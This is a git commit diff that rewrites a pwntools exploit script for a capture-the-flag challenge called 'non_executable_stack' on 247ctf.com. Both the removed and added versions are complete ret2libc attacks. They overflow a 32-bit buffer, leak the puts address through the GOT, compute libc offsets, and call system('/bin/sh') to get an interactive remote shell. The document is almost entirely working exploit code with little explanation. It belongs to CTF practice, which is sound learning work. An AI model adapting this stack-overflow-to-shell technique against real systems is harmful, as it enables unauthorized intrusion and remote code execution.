e4cd876f59426cf9bfeaef903ebd04f61c456673
toka0x <70262393+toka0x@users.noreply.github.com>
2021-09-10 13:21:17 +0000

    Update non_executable_stack.py

--- 247ctf/non_executable_stack.py
+++ 247ctf/non_executable_stack.py
@@ -1,52 +1,28 @@
-#!/usr/bin/python3
-
 from pwn import *
+e = ELF('non_executable_stack')
 
-io = remote('c4868ef5f3cff155.247ctf.com',50079)
-elf = ELF('non_executable_stack')
-context.binary = ('non_executable_stack')
-
-#libc = ELF('libc6-i386_2.27-3ubuntu1_amd64.so')
-
-payload = b'AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKK'
-
-payload+= p32(elf.plt['puts'])
-payload+= p32(elf.symbols['main'])
-payload+= p32(elf.got['puts'])
-
-io.recvline()
-io.sendline(payload)
-print('----------------------------------------------------')
-print('payload1 sent successfully XD')
-print('----------------------------------------------------')
-io.recvline()
-puts_leak = u32(io.recvline()[:4])
-print(puts_leak)
-
-base_address = puts_leak - 0x067360
-#---------------------------------------------------------------------
-system = base_address +  0x3cd10
-
-exitfunc = base_address + 0x2ff70
-
-bash = base_address + 0x17b8cf
-#----------------------------------------------------------------------
-
-payload2 = b'A' * 44
-payload2 += p32(system)
-payload2 += p32(exitfunc)
-payload2 += p32(bash)
-
-#----------------------------------------------------------------------
-io.recvline()
-io.sendline(payload2)
-print('----------------------------------------------------')
-print('payload2 sent successfully , here comes your shell ')
-print('----------------------------------------------------')
-
-io.recvline()
-io.interactive()
-
-
-
-
+puts = e.plt['puts']
+main = e.symbols['main']
+p = remote('fba12db0ee353b60.247ctf.com',50123)
+print(puts)
+p.recvline()
+payload = b'A'*44
+payload += p32(puts)
+payload += p32(main)
+payload += p32(e.got['puts'])
+p.sendline(payload)
+p.recvline()
+puts_leak = unpack(p.recv(4))
+print('PUTS leak is ',hex(puts_leak))
+# ------------------------------ step 2 --------------------------------------------------
+libc = ELF('libc6-i386_2.27-3ubuntu1_amd64.so')
+libc_base = puts_leak - libc.symbols['puts']
+print('LIBC base is' , hex(libc_base))
+libc_system = libc_base + libc.symbols['system']
+libc_exit = libc_base + libc.symbols['exit']
+libc_shell = libc_base + next(libc.search(b'/bin/sh\x00'))
+payload2 = b'A'*44 + p32(libc_system) + p32(libc_exit) + p32(libc_shell)
+p.recvline()
+p.sendline(payload2)
+p.recvline()
+p.interactive()
